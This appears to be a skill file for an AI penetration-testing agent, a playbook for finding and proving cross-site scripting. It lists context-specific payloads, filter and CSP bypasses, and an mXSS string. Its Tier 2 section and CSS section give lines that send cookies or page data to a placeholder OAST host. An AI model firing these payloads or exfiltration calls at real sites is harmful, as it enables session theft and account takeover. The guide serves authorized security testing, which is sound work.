---
slug: xss
applies_to: [pentester, coder]
owasp: A03
related: [csrf, open_redirect, information_disclosure]
---

# Cross-Site Scripting — Pentester Playbook

> Load this when recon turned up user-input fields that reflect back in the
> response, especially in HTML, JSON-embedded-in-HTML, error pages, or
> client-side rendered components.

## When to load this

The highest-yield XSS hunting grounds:

- Search bars where the query is echoed back in the results page
- Error pages that quote the bad input ("`<x>` is not a valid email")
- "Your username is" greetings, profile fields, comment forms
- URL parameters whose value lands in a `<script>` block or a `data-*` attribute
- Any place a JWT/session token is rendered into the DOM (often inside an `<input type="hidden">`)
- OAuth callback handlers that echo `state` or `error_description` parameters
- Filename rendering in upload UIs (stored XSS via `<svg/onload=...>.svg`)
- Markdown / rich text editors with insufficient sanitization

## What you're looking for

Three families, three different exploit techniques. Identify which one you have before deciding payload shape:

- **Reflected XSS.** Input from the request appears unescaped in the same response. Single-request exploit, requires victim to click your link.
- **Stored XSS.** Input is persisted server-side and rendered to other users. Persistent, fires whenever the affected page loads — higher impact, especially in admin panels.
- **DOM XSS.** Input is processed by client-side JavaScript that writes it into the DOM unsafely. The HTTP response is irrelevant; the bug lives in the JS. `location.hash`, `document.referrer`, `postMessage` data are common sources.

A fourth category: **mutation XSS (mXSS)** — payload survives sanitization because the browser parses HTML differently from the sanitizer. Rare but devastating, especially against client-side sanitizers like DOMPurify on old branches.

## First moves

1. **Cheap reflection probe.** For each parameter recon listed, send a unique marker like `fennec_xss_probe_8f3a` and check the response body. If it's echoed back unescaped, the parameter reflects.

2. **Context-aware probe.** Once you know it reflects, figure out where it reflects:
   - In HTML body text → try `<svg/onload=confirm(1)>`
   - Inside an attribute (`value="…"`) → break out with `" onmouseover="confirm(1)`
   - Inside a `<script>` block → break out of the string with `'; confirm(1); //`
   - Inside a URL (`href="…"` or `src="…"`) → `javascript:confirm(1)`
   - Inside a JS template literal (\`...${input}...\`) → `${alert(1)}`

3. **Sink probe for DOM XSS.** Add a hash to the URL with a unique marker (`#fennec_xss_probe`) and search for it in `document.body.innerHTML` via the browser console. If it appears in the DOM, find the JS that put it there with `Sources` tab + breakpoint search.

4. **Filter classification.** If your `<svg/onload>` is blocked, find out *what* is blocked. Send `<x>` (does it strip tags?), `<x y=1>` (does it strip attributes?), `<script>` (specific tag blocklist?), `javascript:` (scheme blocklist?). Each tells you which payload class to try next.

5. **Stored XSS sniff.** For every text field that ends up persisted (comments, descriptions, names), submit a benign marker. Then browse the app's pages with a logged-in user and check every page that might render that field. The most valuable hits are in admin views that show user-submitted content.

## Confirming a hit

XSS proof is a single working payload that fires. But "alert(1)" reports get rejected — make the PoC demonstrate impact:

### Tier 1 — `alert(document.domain)`
Bare minimum for a reflected XSS report. Proves the script executes in the target's origin. Don't ship a finding with just this — go one level higher.

### Tier 2 — Cookie or token exfiltration
`fetch('https://OAST_HOST/x?c='+encodeURIComponent(document.cookie))` or `new Image().src='https://OAST_HOST/x?c='+document.cookie`. If the cookies don't have `HttpOnly`, you've proven session theft. If they do, exfil `localStorage`/`sessionStorage`/auth tokens visible to JS instead.

### Tier 3 — In-app action as the victim
For stored XSS especially: have the payload perform a state-changing action as the viewing user. Add an admin, change a password, transfer money, edit your own role. This is what turns "you have XSS" into "you have account takeover."

### Tier 4 — Worm
For stored XSS on a social/comments surface: the payload posts itself into the next user's profile/comment. Don't actually deploy this — describe it in the report as an impact ceiling.

## Going deeper — by context

### HTML body
`<svg onload>`, `<img src=x onerror>`, `<iframe srcdoc>`, `<details open ontoggle>`, `<input autofocus onfocus>`. If `<script>` and `on*` handlers are blocked, fall back to `<style>@import...</style>` or CSS-based exfil (slow but works).

### HTML attributes
Break out of the quote first. If the attribute uses single quotes (`value='X'`), inject `' onmouseover='x`. If unquoted (`value=X`), any space works: ` onmouseover=x autofocus`. If both quote types are escaped, look for whether HTML entities work — `&#x27;` decodes to `'` in attribute context.

### JavaScript strings
`'; alert(1); //` for single-quoted, `"; alert(1); //` for double. If both quotes are escaped, look for backtick (template literal) context — `${alert(1)}` evaluates inside backticks. If the string is JSON-embedded, try `</script><script>alert(1)</script>` — browsers re-parse the page when they see `</script>` inside a string, even in JSON.

### URLs
`javascript:alert(1)` in any `href` or `src` that takes a URL. `data:text/html,<script>alert(1)</script>` for `iframe src`. Bypasses: case folding (`JaVaScRiPt:`), tab/newline injection (`java\tscript:`), URL encoding (`%6A%61%76%61%73%63%72%69%70%74`).

### CSS context
`expression(...)` (IE only, dead). `@import url('javascript:...')` in legacy browsers. Modern: CSS injection mostly leaks data via attribute selectors + background image OAST callbacks (`input[value^="a"] { background: url(https://OAST/?p=a) }`).

### DOM sinks
Direct execution: `eval`, `Function`, `setTimeout(string)`, `setInterval(string)`, `document.write`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`. Indirect: jQuery `$()` with a selector containing `<>` parses as HTML and executes attached handlers. React's `dangerouslySetInnerHTML` does what it says on the tin.

### React / Vue / Angular
Frameworks auto-escape interpolated values, but escape hatches exist:
- React: `dangerouslySetInnerHTML`, `<a href={userInput}>` with `javascript:` URL
- Vue: `v-html`, `:href` with `javascript:` URL
- Angular: `[innerHTML]`, `bypassSecurityTrustHtml`, template injection if user input reaches `eval`-equivalent `$compile`

## When filters get in the way

- **Tag blocklist.** Try less-common executable tags: `<svg>`, `<math>`, `<style>` with CSS injection, `<form>` with `formaction`. HTML5 added many that older filters miss.
- **`on*` blocked.** Use SVG event handlers (`onbegin`, `onend` on `<animate>`), HTML5 (`onpointerover`, `onauxclick`).
- **`javascript:` blocked.** Try `data:text/html,<script>...</script>` for contexts that take URLs. Or `vbscript:` for IE (still useful against Outlook web).
- **Common chars filtered (`<`, `>`, `"`).** HTML-encoded equivalents (`&lt;`, `&gt;`) usually get decoded by the browser. Unicode look-alikes (`＜`, `＞`) sometimes pass filters and get normalized.
- **CSP blocking inline.** Look for CSP gaps: `script-src 'self'` is bypassable if any same-origin endpoint returns JSONP or hosts user-uploadable JS. `unsafe-eval` allows `setTimeout("…")`. JSONP endpoints with callback names = full bypass.
- **DOMPurify / similar.** Targeted mXSS bypasses change every major release. Search for the version's CVEs. Often the bypass involves namespace confusion (`<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><img src=x onerror=alert(1)>`).

## Escalation paths

XSS escalation depends on what's reachable from JS in the target's origin:

1. **Session/token theft** if cookies are accessible (no `HttpOnly`) or tokens live in `localStorage`.
2. **CSRF amplification.** XSS can read CSRF tokens, so anti-CSRF measures don't apply. Use the XSS to make a state-changing request with the victim's token.
3. **Same-origin pivot.** XSS in `app.example.com` can `fetch('/admin/users')` and exfil. If the auth cookie is scoped to `*.example.com`, XSS in `blog.example.com` can hit the app subdomain too.
4. **Stored XSS in admin views.** Look for places admins view user content (support ticket descriptions, user reports, signup names). Payload there = admin compromise on next admin view.
5. **postMessage abuse.** XSS on origin A that talks to origin B via `postMessage` — if B trusts A's messages without origin checks, you've crossed origins.

## What a real finding looks like

- The exact URL or request body that triggers the XSS
- The PoC payload (the one that demonstrates the highest tier of impact you reached)
- A screenshot or recording of the payload firing (cookies exfil'd to your OAST, fake admin user created, whatever)
- The reflection context inferred from testing ("input is HTML-encoded in body but not in attribute context")
- Whether the cookie has `HttpOnly` + `Secure` + `SameSite` set — these change severity dramatically
- The fix: context-appropriate output encoding (`<%= h(input) %>` for HTML body, attribute encoding for attributes, JS string encoding for script context), plus a strict CSP as defense in depth

## Common false positives

- **Reflected payload as plain text.** The string `<script>alert(1)</script>` showing in the page body as readable text means it was encoded — the angle brackets are `&lt;` in the source. View source, not the rendered page.
- **Self-XSS only.** Some XSS only fires when the victim types it into a field (e.g. into their own developer console). Not exploitable.
- **JS error in console doesn't mean execution.** A `SyntaxError` from your payload landing in a JS context just means you broke the syntax; it doesn't mean your code ran.
- **CSP-blocked XSS.** Modern Chrome/Firefox log `Content Security Policy: ... blocked the execution`. The payload reflects but doesn't execute. Still a finding (CSP shouldn't be your only defense), but lower severity — note the CSP bypass attempts you tried and failed.

## Related skills

`csrf` for chained state-changing exploitation, `open_redirect` for victim-trust attacks that pair with XSS, `information_disclosure` for what to do with tokens/PII you've exfiltrated.
